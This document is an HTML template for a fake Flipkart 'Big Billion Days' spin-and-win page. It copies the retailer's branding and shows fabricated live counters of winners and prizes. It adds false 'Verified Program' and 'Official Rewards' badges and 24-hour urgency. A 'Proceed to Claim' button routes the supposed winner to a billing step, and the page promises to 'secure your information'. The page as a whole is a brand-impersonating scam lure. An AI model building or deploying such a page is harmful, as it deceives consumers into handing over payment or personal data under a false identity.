

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flipkart Anniversary Rewards - Win Exclusive Prizes</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="{{ asset('style/welcom.css') }}">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <script src="{{ asset('javascript/actiflog.js') }}" defer></script>

    
</head>
<body>
    <nav class="flipkart-navbar">
        <div class="max-w-7xl mx-auto px-4 py-3">
            <div class="flex items-center justify-between">
                <div class="flex items-center space-x-8">
                    <div class="text-2xl font-bold text-white">Flipkart</div>
                    <div class="hidden md:flex space-x-6">
                        <a href="#" class="text-white hover:text-yellow-300 transition-colors">Electronics</a>
                        <a href="#" class="text-white hover:text-yellow-300 transition-colors">Fashion</a>
                        <a href="#" class="text-white hover:text-yellow-300 transition-colors">Home</a>
                        <a href="#" class="text-white hover:text-yellow-300 transition-colors">Appliances</a>
                    </div>
                </div>
                <div class="hidden md:flex flex-1 max-w-lg mx-8">
                    <div class="relative w-full">
                        <input type="text" placeholder="Search for products, brands and more" 
                               class="w-full py-3 px-4 pr-12 rounded-l-md border-none outline-none">
                        <button class="absolute right-0 top-0 h-full px-4 bg-yellow-400 rounded-r-md hover:bg-yellow-500 transition-colors">
                            <i class="fas fa-search text-blue-800"></i>
                        </button>
                    </div>
                </div>
                <div class="flex items-center space-x-6">
                    <button class="text-white hover:text-yellow-300 transition-colors">
                        <i class="fas fa-user mr-2"></i>
                        <span class="hidden sm:inline">Login</span>
                    </button>
                    <button class="text-white hover:text-yellow-300 transition-colors">
                        <i class="fas fa-shopping-cart mr-2"></i>
                        <span class="hidden sm:inline">Cart</span>
                    </button>
                </div>
            </div>
        </div>
    </nav>

    <!-- Header Banner -->
    <div class="bg-gradient-to-r from-blue-500 via-blue-600 to-blue-700 py-12 relative overflow-hidden">
        <!-- Background Pattern -->
        <div class="absolute inset-0 opacity-10">
            <div class="absolute top-4 left-10 w-16 h-16 border-2 border-white rounded-full"></div>
            <div class="absolute top-20 right-20 w-8 h-8 bg-yellow-300 rounded-full"></div>
            <div class="absolute bottom-10 left-1/4 w-12 h-12 border border-white rotate-45"></div>
            <div class="absolute bottom-6 right-10 w-6 h-6 bg-white rounded-full"></div>
        </div>
        
        <div class="max-w-6xl mx-auto px-4 text-center relative z-10">
            <!-- Anniversary Badge -->
            <div class="inline-flex items-center bg-yellow-400 text-blue-900 px-4 py-2 rounded-full text-sm font-bold mb-4">
                <i class="fas fa-birthday-cake mr-2"></i>
                17th Anniversary Special
            </div>
            
            <h1 class="text-5xl md:text-6xl font-black mb-4 text-white leading-tight">
                <span class="inline-block animate-pulse">🎉</span>
                Big Billion Days
                <span class="inline-block animate-pulse">🎁</span>
            </h1>
            
            <div class="text-2xl md:text-3xl font-bold text-yellow-200 mb-3">
                Spin & Win Mega Rewards!
            </div>
            
            <p class="text-lg text-blue-100 mb-6 max-w-3xl mx-auto">
                Celebrate Flipkart's 17th Anniversary with exclusive prizes worth up to ₹80,000! 
                <strong class="text-yellow-200">Limited time offer</strong> - Only for registered users.
            </p>
            
            <!-- Feature Pills -->
            <div class="flex flex-wrap justify-center gap-3 mb-6">
                <div class="bg-white bg-opacity-20 backdrop-blur-sm rounded-full px-4 py-2 text-sm text-white border border-white border-opacity-30">
                    <i class="fas fa-shield-check mr-2 text-green-300"></i>
                    Verified Program
                </div>
                <div class="bg-white bg-opacity-20 backdrop-blur-sm rounded-full px-4 py-2 text-sm text-white border border-white border-opacity-30">
                    <i class="fas fa-truck mr-2 text-blue-300"></i>
                    Free Delivery
                </div>
                <div class="bg-white bg-opacity-20 backdrop-blur-sm rounded-full px-4 py-2 text-sm text-white border border-white border-opacity-30">
                    <i class="fas fa-certificate mr-2 text-yellow-300"></i>
                    Official Rewards
                </div>
                <div class="bg-white bg-opacity-20 backdrop-blur-sm rounded-full px-4 py-2 text-sm text-white border border-white border-opacity-30">
                    <i class="fas fa-clock mr-2 text-orange-300"></i>
                    24H Only
                </div>
            </div>
            
            <!-- Live Stats -->
            <div class="bg-white bg-opacity-10 backdrop-blur-sm rounded-2xl p-4 max-w-2xl mx-auto border border-white border-opacity-20">
                <div class="grid grid-cols-3 gap-4 text-center">
                    <div>
                        <div class="text-2xl font-bold text-yellow-300" id="totalWinners">12,847</div>
                        <div class="text-xs text-blue-100">Winners Today</div>
                    </div>
                    <div>
                        <div class="text-2xl font-bold text-green-300" id="totalPrizes">₹2.4Cr+</div>
                        <div class="text-xs text-blue-100">Prizes Given</div>
                    </div>
                    <div>
                        <div class="text-2xl font-bold text-orange-300 flex items-center justify-center">
                            <i class="fas fa-circle text-xs mr-1 animate-pulse"></i>
                            <span id="liveUsers">1,247</span>
                        </div>
                        <div class="text-xs text-blue-100">Playing Now</div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <main class="max-w-4xl mx-auto px-4 py-8">
        <!-- Progress Bar -->
        <div class="mb-8">
            <div class="flex justify-between items-center mb-3">
                <span class="text-sm font-semibold text-blue-600 bg-blue-50 px-3 py-1 rounded-full">
                    Step 1 of 4
                </span>
                <span class="text-sm text-gray-600">25%</span>
            </div>
            <div class="progress-container">
                <div class="progress-bar" style="width: 25%"></div>
            </div>
        </div>

        <div class="bg-white rounded-2xl shadow-xl p-8 relative overflow-hidden">
            <!-- Step 1: Spin Wheel -->
            <div class="text-center mb-8">
                <h2 class="text-3xl font-bold text-gray-800 mb-4">
                    Try Your Luck!
                </h2>
                <p class="text-gray-600 text-base">
                    Spin the wheel to discover your reward. All prizes are genuine Flipkart products.
                </p>
            </div>

            <div class="wheel-container">
                <div class="wheel-glow"></div>
                <div class="wheel-pointer"></div>
                <div class="wheel" id="wheel">
                    <div class="wheel-segment">
                        <div class="wheel-segment-content">
                            <i class="fas fa-mobile-alt wheel-segment-icon"></i>
                            <div class="wheel-segment-text">iPhone 15</div>
                            <div class="wheel-segment-price">₹79,999</div>
                        </div>
                    </div>
                    <div class="wheel-segment">
                        <div class="wheel-segment-content">
                            <i class="fas fa-headphones wheel-segment-icon"></i>
                            <div class="wheel-segment-text">boAt Audio</div>
                            <div class="wheel-segment-price">₹2,999</div>
                        </div>
                    </div>
                    <div class="wheel-segment">
                        <div class="wheel-segment-content">
                            <i class="fas fa-clock wheel-segment-icon"></i>
                            <div class="wheel-segment-text">Smartwatch</div>
                            <div class="wheel-segment-price">₹4,999</div>
                        </div>
                    </div>
                    <div class="wheel-segment">
                        <div class="wheel-segment-content">
                            <i class="fas fa-mobile wheel-segment-icon"></i>
                            <div class="wheel-segment-text">Redmi Phone</div>
                            <div class="wheel-segment-price">₹15,999</div>
                        </div>
                    </div>
                    <div class="wheel-segment">
                        <div class="wheel-segment-content">
                            <i class="fas fa-tablet-alt wheel-segment-icon"></i>
                            <div class="wheel-segment-text">iPad</div>
                            <div class="wheel-segment-price">₹18,999</div>
                        </div>
                    </div>
                    <div class="wheel-segment">
                        <div class="wheel-segment-content">
                            <i class="fas fa-gamepad wheel-segment-icon"></i>
                            <div class="wheel-segment-text">Controller</div>
                            <div class="wheel-segment-price">₹3,499</div>
                        </div>
                    </div>
                    <div class="wheel-segment">
                        <div class="wheel-segment-content">
                            <i class="fas fa-camera wheel-segment-icon"></i>
                            <div class="wheel-segment-text">GoPro</div>
                            <div class="wheel-segment-price">₹8,999</div>
                        </div>
                    </div>
                    <div class="wheel-segment">
                        <div class="wheel-segment-content">
                            <i class="fas fa-volume-up wheel-segment-icon"></i>
                            <div class="wheel-segment-text">Alexa</div>
                            <div class="wheel-segment-price">₹5,999</div>
                        </div>
                    </div>
                    <div class="wheel-center">
                        <i class="fas fa-play mr-1"></i>
                        SPIN
                    </div>
                </div>
                <button class="spin-button" id="spinBtn" onclick="spinWheel()">
                    <i class="fas fa-magic mr-3"></i>
                    Spin to Win Big!
                </button>
            </div>

            <!-- Prize Result (Initially Hidden) -->
            <div id="prizeResult" class="text-center mt-8" style="display: none;">
                <!-- Mystery Box Animation -->
                <div id="mysteryBoxContainer" class="relative mb-8">
                    <div class="mystery-box" id="mysteryBox">
                        <!-- Box Base -->
                        <div class="box-base"></div>
                        <!-- Box Lid -->
                        <div class="box-lid" id="boxLid">
                            <div class="lid-top"></div>
                            <div class="ribbon-vertical"></div>
                            <div class="ribbon-horizontal"></div>
                            <div class="bow">
                                <div class="bow-left"></div>
                                <div class="bow-right"></div>
                                <div class="bow-center"></div>
                            </div>
                        </div>
                        <!-- Sparkles -->
                        <div class="sparkles" id="sparkles">
                            <span class="sparkle" style="--delay: 0s; --x: 20px; --y: -30px;">✨</span>
                            <span class="sparkle" style="--delay: 0.2s; --x: -25px; --y: -35px;">⭐</span>
                            <span class="sparkle" style="--delay: 0.4s; --x: 30px; --y: -25px;">💫</span>
                            <span class="sparkle" style="--delay: 0.6s; --x: -20px; --y: -40px;">✨</span>
                            <span class="sparkle" style="--delay: 0.8s; --x: 25px; --y: -45px;">⭐</span>
                        </div>
                    </div>
                </div>

                <!-- Prize Popup (Initially Hidden) -->
                <div id="prizePopup" class="prize-popup" style="display: none;">
                    <div class="popup-content">
                        <div class="w-24 h-24 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6 animate-bounce">
                            <i class="fas fa-trophy text-green-600 text-4xl"></i>
                        </div>
                        <h2 class="text-3xl font-bold text-gray-800 mb-2">Congratulations!</h2>
                        <p class="text-gray-600 text-base mb-6">You've won a fantastic prize:</p>
                        
                        <div id="prizeDisplay" class="bg-gradient-to-r from-green-400 to-green-600 text-white p-8 rounded-2xl mb-8 max-w-md mx-auto transform scale-0 transition-transform duration-500">
                            <div class="text-center">
                                <i id="prizeIcon" class="fas fa-gift text-5xl mb-4"></i>
                                <h3 id="prizeName" class="text-3xl font-bold mb-2"></h3>
                                <p class="text-green-100">Market Value: <span id="prizeValue" class="font-bold text-xl"></span></p>
                            </div>
                        </div>
                        
                        <button class="flipkart-btn text-lg px-8 py-4" id="closePrizePopup" onclick="proceedToBilling()">
                            <i class="fas fa-arrow-right mr-2"></i>
                            Proceed to Claim
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <!-- Loading Overlay -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-content">
            <div class="loading-spinner"></div>
            <div id="loadingText" class="text-xl font-semibold mb-2">Processing...</div>
            <div class="loading-dots">
                <span></span>
                <span></span>
                <span></span>
            </div>
            <div class="text-sm mt-4 opacity-75" id="loadingSubtext">Please wait while we secure your information</div>
        </div>
    </div>

    <!-- Celebration -->
    <div class="celebration" id="celebration"></div>
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
    <script src="{{ asset('javascript/spin.js') }}" defer></script>

</body>
</html>
